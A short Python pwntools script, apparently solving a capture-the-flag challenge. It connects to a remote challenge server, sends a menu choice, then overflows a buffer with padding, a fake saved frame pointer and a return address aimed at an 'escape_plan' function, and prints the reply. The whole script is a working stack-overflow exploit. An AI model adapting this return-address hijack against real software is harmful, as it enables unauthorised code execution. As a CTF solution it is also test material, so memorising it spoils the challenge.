from pwn import *

p = remote("206.189.121.145", 31207)

p.recvuntil(b">> ")
p.sendline(b"69")
p.recvuntil(b">> ")

offset = 56
writable = 0x404100
escape_plan_jmp_addr = 0x00000000004012b0

payload = b"A" * (offset - 8)
payload += p64(writable)
payload += p64(escape_plan_jmp_addr)

p.sendline(payload)

p.recvline()
p.recvline()
p.recvline()
print(p.recvline().decode())
